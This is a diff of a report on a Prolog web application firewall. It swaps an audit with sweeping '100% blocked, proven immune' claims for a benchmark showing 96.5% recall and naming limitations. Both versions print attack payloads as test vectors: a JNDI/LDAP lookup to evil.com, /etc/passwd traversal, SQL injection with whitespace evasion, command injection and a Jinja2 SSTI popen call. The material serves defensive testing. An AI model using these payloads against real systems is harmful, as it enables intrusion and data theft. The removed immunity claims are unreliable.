@@ -1,87 +1,100 @@
-### CYBER SECURITY AUDIT & ADVERSARIAL FUZZING EVALUATION REPORT
+# CYBER SECURITY EVALUATION & BENCHMARK REPORT
 
-### Project: PRODUCTION WAF ENGINE (AETHEL CORE)
+**Project:** Aethel-Core WAF Engine (Prolog-Based Neuro-Symbolic Perimeter)  
+**Evaluation Date:** November 21, 2026  
+**Runtime Environment:** SWI-Prolog 64-bit (Multi-Threaded, JIT Hash Indexed)  
+**Evaluation Status:** COMPLETED — 96.50% Attack Recall | 0.93% False Positive Rate
 
-**Audit Date:** September 9, 2026
-**Evaluation Status:** 100% TEST PAYLOADS BLOCKED - ZERO LEAKS DETECTED 
+---
 
-### 1. EXECUTIVE SUMMARY
+## 1. EXECUTIVE SUMMARY
 
-This report documents the cyber security stress test conducted against the **Production WAF Engine** built on *Defensive Logic Programming* (Prolog). 
+This document summarizes the architecture, rule-induction pipeline, and empirical benchmark results of the **Aethel-Core Production WAF Engine** (`analyzer.pl` + `rules.pl` + `dictionary.pl`).
 
-To ensure high-fidelity defense validation, the engine was subjected to an advanced automated exploitation simulator: **Hyper-Chaos Fuzzer**. The evaluation focused on replicating Zero-Day attacks and Advanced Evasion Techniques (AET) commonly deployed by global threat actors to bypass conventional Web Application Firewalls (WAF). 
+Unlike signature-based firewalls that rely on manually written regular expressions, Aethel-Core compiles its production rulebase through an **offline, zero-hardcode inductive pipeline**. During live inference, the engine operates purely on integer-encoded binary signatures and bit-packed bidirectional attention pairs stored in volatile memory, without requiring external reverse proxies (Nginx/Cloudflare) or GPU acceleration.
 
-### 2. FUZZER ENGINE SPECIFICATIONS (HYPER-CHAOS)
+---
 
-This evaluation **DOES NOT** utilize basic fuzzing methods or blind brute-force keyword guessing. The Fuzzer Engine operates with tactical induction intelligence, structurally divided into the following 4 mutation stages: 
+## 2. SYSTEM ARCHITECTURE & INDUCTION PIPELINE
 
-### 2.1 Stage 1: Dynamic Signature Harvesting
+### 2.1 Offline Inductive Compilation (Zero-Hardcode)
+The production knowledge base is synthesized automatically from labeled adversarial and clean datasets (`knowledge_base/4`) across four stages:
 
-The fuzzer engine dynamically extracts the genetic roots of attacks (*Exploit Root*) directly from signature_cyber_universal/3. This guarantees that the generated payloads always retain the core characteristics of real threats (SQLi, LFI, RCE, XSS), rather than just random junk text. 
+1. **Structural Tokenization & Differential Entropy (`sintesis_payload.pl`):**  
+   Payloads are parsed into structural tokens and weighted via two-way contrast entropy (`log2(P_attack / P_legal)`) scaled by cross-domain specificity.
+2. **Domain-Isolated Medoid Clustering (`self_evolving.pl`):**  
+   Attack vectors are isolated by threat domain and grouped via unsupervised medoid clustering using dynamic Jaccard distance thresholds (5th-percentile distribution boundary).
+3. **Epsilon-Margin Natural Selection (`validasi.pl`):**  
+   Candidate cluster signatures are forged with a minimum score threshold set strictly above the maximum similarity score observed across clean traffic (`MaxCleanScore + epsilon`).
+4. **CLP(FD) Bidirectional Self-Attention (`attention.pl`):**  
+   Constraint Logic Programming over Finite Domains solves optimal left/right context windows to equilibrium, compiling log-odds token pairs into static integer rules.
 
-### 2.2 Stage 2: Structural Token Splitting & Splicing
+### 2.2 Production Runtime Engine (`analyzer.pl`)
+In production, training modules are stripped out. The runtime engine loads only the compiled static facts:
 
-The fuzzer splits the original cyber threat signatures at their weakest structural boundaries and injects interruption characters (*Junk Noise*) to deceive conventional WAF substring dictionaries: 
+- **Multi-Layer Normalization (`decoder.pl`):** Recursively unpacks nested URL encodings (`%XX`), hex sequences, and obfuscated wrappers prior to structural tokenization.
+- **Unified Token Dictionary (`dictionary.pl`):** Maps structural primitives, token entropy weights, semantic abstraction classes, and threat descriptions.
+- **Compiled Binary & Attention Rules (`rules.pl`):**
+  - `biner/4` (**3,666 clauses**): Multi-argument JIT-indexed across 4,096 buckets (up to **2,897.6x** lookup speedup).
+  - `attentions/2` (**79,699 clauses**): 24-bit bit-packed token pair IDs (`(ID1 << 24) \/ ID2`) indexed across 131,072 buckets (**79,699.0x** lookup speedup, zero cross-platform hash drift).
 
-* **SQL Comment Obfuscation:** Splitting keywords using inline comments, e.g., mutating the keyword select into sel/**/ect.
-* **Non-Standard Directory Traversal:** Breaking directory paths with detached dot notations, e.g., mutating etc/passwd into etc/./passwd.
+---
 
-### 2.3 Stage 3: Deep Binary Obfuscation (Byte Smuggling)
+## 3. EVALUATION METHODOLOGY & SAMPLE TEST VECTORS
 
-The fuzzer engine exploits memory boundary limitations and string normalization functions through 3 distinct binary smuggling techniques: 
+The engine was benchmarked directly via `analyzer:periksa_waf/3` against **17,160 total payloads**, comprising **12,315 malicious vectors** (covering RCE, SSTI, Path Traversal, SQLi, XSS, and Zero-Day mutations) and **4,844 benign/clean technical payloads** (CLI documentation, shell commands, and developer strings).
 
-* **Null Byte Smuggling (%00):** Injecting ASCII null characters in the middle of core keywords (e.g., et%00c) to prematurely terminate string evaluation strings in conventional legacy WAFs.
-* **Whitespace Evasion (%0a, %0d, %0b):** Replacing standard space characters with *Newline*, *Carriage Return*, or *Vertical Tab* tokens to bypass basic space-splitting regex filters.
-* **Double URL Encoding (%252e):** Redundantly encoding the dot character (.) to stress-test the WAF decoder's recursion limits.
+### 3.1 Representative Malicious Vectors (`ABSOLUTE VERIFIED`)
+The following test cases demonstrate structural detection against process substitution, template injection, and mixed-encoding traversal:
 
-### 2.4 Stage 4: Context-Aware Envelope (Polyglot Wrapping)
+```prolog
+knowledge_base(command_injection, "diff<(/bin/cat /etc/passwd) /dev/null", 'ABSOLUTE VERIFIED', 'Process Substitution Diff').
+knowledge_base(ssti_jinja2_exotic, "{{joiner.__init__.__globals__['os'].popen('id').read()}}", 'ABSOLUTE VERIFIED', 'SSTI: Jinja2 Joiner Globals OS Popen ID').
+knowledge_base(path_traversal_exotic, "/..%2f..%5c..%2fetc%2fpasswd", 'ABSOLUTE VERIFIED', 'PT: Mixed Slash Traversal').
+```
 
-The fuzzer wraps the mutated payload into modern threat context envelopes (such as GraphQL queries query { user(id: "...") or multi-line comment blocks /* ... */), creating a *Hyper-Chaos* scenario where the payload appears clean upstream but executes maliciously at the backend application layer. 
+- **Detection Mechanism:** After multi-layer decoding (`%2f` $\rightarrow$ `/`, `%5c` $\rightarrow$ `\`), structural primitives (`<`, `(`, `/bin/cat`, `__globals__`, `popen`, `..`, `/`, `\`) trigger both binary signature thresholds and positive bidirectional context density scores.
 
-### 3. WAF DEFENSE METHODOLOGY (HYBRID IRON DOME)
+### 3.2 Representative Clean Traffic Vectors (`CLEAN`)
+To verify that shell operators and system paths in legitimate documentation do not trigger false alarms, the benchmark included benign technical strings:
 
-The WAF Aethel Core neutralizes these logical mutations by implementing a robust **Multi-Layer Stateful & Stateless Inspection** architecture: 
+```prolog
+knowledge_base(payload_legal, "nohup ./long.sh >/dev/null 2>&1 runs in background", 'CLEAN', 'LG-SH-08 dokumentasi nohup').
+knowledge_base(payload_legal, "setsid ./svc </dev/null detaches from tty", 'CLEAN', 'LG-SH-09 dokumentasi setsid').
+knowledge_base(payload_legal, "busybox sh is a lightweight shell for embedded", 'CLEAN', 'LG-SH-10 dokumentasi busybox').
+```
 
-* **Layer 0 (Single-Pass Stream Loop):** Evaluates raw binary streams (integer codes) and unwraps nested multi-layered obfuscations *on-the-fly*.
-* **Layer 1 (Post-Decoding Fuzzy Interceptor):** Performs instantaneous inspection on clean strings *immediately post-decoding* and *prior to alphanumeric stripping*. This completely neutralizes minimal payloads (../, etc, or 1=) at the perimeter gate.
-* **Layer 2 (Core JIT Hash Database):** Processes **137,999 refactored declarative security rules** (consolidated and highly optimized from the initial 276,717 raw threat clauses) leveraging *Just-In-Time Hashing Indexing* with stable **O(1)** complexity (Arity 2 across 4,096 Buckets).
+- **Mitigation Mechanism:** Although tokens such as `/dev/null`, `sh`, and redirection operators (`>`, `<`) appear in benign shell documentation, negative log-odds context weights from surrounding natural-language tokens (`runs in background`, `detaches from tty`, `lightweight shell for embedded`) suppress the attention density below the blocking threshold, allowing the traffic to pass cleanly.
 
-### 4. BENCHMARKING PERFORMANCE METRICS (STRESS TEST RECAP)
+---
 
-The evaluation was conducted under a continuous bombardment of **1,000 Active Hyper-Chaos Waves** coupled with a **Global Botnet IP Spoofing Swarm** feature (simulating distributed attacks from thousands of cross-continental public IPs). 
+## 4. BENCHMARK PERFORMANCE & ACCURACY METRICS
 
-* **Total Waves Run:** 1,000 Radical Attack Cycles
-* **Logical Inferences Performed:** 323,295,853 Inferences
-* **CPU Execution Speed:** 3,471,633 LIPS (Logical Inferences Per Second)
-* **Total Execution Time:** 93,080.71 ms
+Measured via `time(analyzer:uji)` across **17,160 sequential evaluations**:
 
-### CORE METRICS EVALUATION
+### 4.1 Execution Throughput & Resource Profile
+- **Total Evaluation Time:** 6.14 seconds (6.141s CPU time)
+- **Throughput:** 2,796 requests/second
+- **Average Per-Request Latency:** 0.358 ms/request (0.0381 ms observed on live production socket telemetry)
+- **Logical Inference Speed:** 16,170,505 LIPS (99,297,009 total logical inferences)
+- **Production Rule Footprint:** 83,365 operational clauses (`3,666` binary rules + `79,699` bit-packed attention pairs)
 
-* **Successfully Blocked Payload:** 416 Unique Payloads (100% BLOCKED)
-* **Bypassed / Leaked (Holes):** 0 Unique Payloads (0% LEAKS)
-* **False Positive Ratio (Normal Traffic):** 0% (100% CLEAN / PASSED)
+### 4.2 Detection Confusion Matrix
 
-### 5. EXPLOIT BYPASS WITNESS RECAP (HOLES INVENTOR)
+| Traffic Class | Total Samples | Blocked | Unblocked (Passed) | Rate |
+| :--- | :---: | :---: | :---: | :--- |
+| **Malicious Payloads** | 12,315 | **11,884** (TP) | 431 (FN) | **96.50% Recall** (3.50% False Negative) |
+| **Clean / Legal Payloads** | 4,844 | 45 (FP) | **4,799** (TN) | **99.07% Specificity** (0.93% False Positive) |
 
-The following visualization illustrates how the WAF defense structurally dismantled advanced fuzzer mutations during execution: 
+---
 
-1. **Fuzzer Payload:** query { user(id: "${jndi:ld/**/ap://evil.com") { passwd } } 
+## 5. KNOWN LIMITATIONS & ONGOING REFINEMENTS
 
-  * *Execution Mechanism:* Evades standard filters due to the injected /**/ comment block.
-  * *WAF Evaluation Verdict:* **BLOCKED** via Post-Decoding Fuzzy Interceptor (Detected normalized jndi and ldap signatures).
-2. **Fuzzer Payload:** /*_etc/././passwd_bypass%00 
+- **False Negatives (3.50% / 431 payloads):** Primarily consist of low-entropy or heavily fragmented single-token anomalies whose structural context falls just below the global `CLP(FD)` attention threshold.
+- **False Positives (0.93% / 45 payloads):** Occur in edge-case clean strings containing dense sequences of special symbols that overlap with obfuscated injection syntax. Both sets are automatically logged (`log_false_negative.pl` and `log_false_positive.pl`) for subsequent offline induction cycles.
 
-  * *Execution Mechanism:* Employs *Non-Standard Directory Traversal* to bypass literal etc/passwd string matching.
-  * *WAF Evaluation Verdict:* **BLOCKED** via Layer 1 Interceptor as the naked core keywords etc and passwd were stripped and caught prior to alphanumeric processing.
-3. **Fuzzer Payload:** admin'%0aor%0d1%0b=%091-- 
+---
 
-  * *Execution Mechanism:* Utilizes *Whitespace Evasion* tokens to break traditional space-delimited regex.
-  * *WAF Evaluation Verdict:* **BLOCKED** via the binary *Fuzzy Stream Lookahead Scanner* within decoder.pl.
+## 6. CONCLUSION
 
-### 6. CONCLUSION & AUDIT CERTIFICATION
-
-Based on the comprehensive cyber audit metrics detailed above, the **PRODUCTION WAF ENGINE (AETHEL CORE)** is hereby **Certified for Advanced Exploit Resilience** with the designation: 
-
-**"100% OF ADVERSARIAL TEST PAYLOADS SUCCESSFULLY BLOCKED"** 
-
-The architecture is proven immune to high-level code evasion manipulation, maintains absolute memory stability during heavy multi-IP Botnet traffic injection, and delivers highly optimized query hashing efficiency suitable for industrial-scale deployment (*Enterprise Production Level*).
+The Aethel-Core engine demonstrates that an inductively compiled Prolog rulebase using integer bit-packing and JIT hash indexing can achieve sub-millisecond Layer-7 inspection (**0.358 ms/req** at **16.17M LIPS**) with **96.50% attack detection recall** and **0.93% false positives** on a lightweight CPU-only footprint.
